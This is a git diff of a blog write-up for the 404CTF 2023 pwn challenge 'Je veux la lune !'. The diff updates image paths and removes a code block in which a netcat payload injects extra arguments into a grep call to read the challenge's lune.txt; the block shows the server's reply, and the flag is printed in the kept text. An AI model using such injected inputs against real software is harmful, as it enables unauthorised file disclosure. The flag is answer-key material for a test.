@@ -1,7 +1,7 @@
 ---
 layout: post
 title: 404CTF 2023 | Je veux la lune !
-image: /assets/images/404ctf/image-je-veux-la-lune.png
+image: /assets/images/404ctf/je-veux-la-lune/cover.png
 date: 2023-06-06 23:40:00
 categories: [404ctf, pwn]
 ---
@@ -10,7 +10,7 @@ This challenge was part of the [404CTF 2023](https://www.404ctf.fr/), organized 
 
 # Challenge Description
 
-![Challenge Description]({{site.baseurl}}/assets/images/404ctf/description-je-veux-la-lune.png)
+![Challenge Description]({{site.baseurl}}/assets/images/404ctf/je-veux-la-lune/description.png)
 
 >> Caligula est assis seul devant une table du café. Il y a devant lui 5 tasses vides empilées, et une 6e qu'il sirote lentement, ainsi qu'un ordinateur qu'il regarde fixement. Des cernes profonds creusent son visage. Il lève des yeux étonnamment vifs vers vous alors que vous vous approchez de lui.
 >>
@@ -77,14 +77,7 @@ grep -wie ^404CTF lune.txt informations.txt
 # Running on the remote server
 
 Let's try this payload !
-```
-& echo "404CTF lune.txt" | nc challenges.404ctf.fr 31215
 
-Bonjour Caligula, ceci est un message de Hélicon. Je sais que les actionnaires de ton entreprise veulent se débarrasser de toi, je me suis donc dépêché de t'obtenir la lune, elle est juste là dans le fichier lune.txt !
-
-En attendant j'ai aussi obtenu des informations sur Cherea, Caesonia, Scipion, Senectus, et Lepidus, de qui veux-tu que je te parle ?
-
-lune.txt:404CTF{70n_C0EuR_v4_7e_1Ach3R_C41uS}
-```
+![Exploit]({{site.baseurl}}/assets/images/404ctf/je-veux-la-lune/expl.png)
 
 > ✅ Flag : `404CTF{70n_C0EuR_v4_7e_1Ach3R_C41uS}`
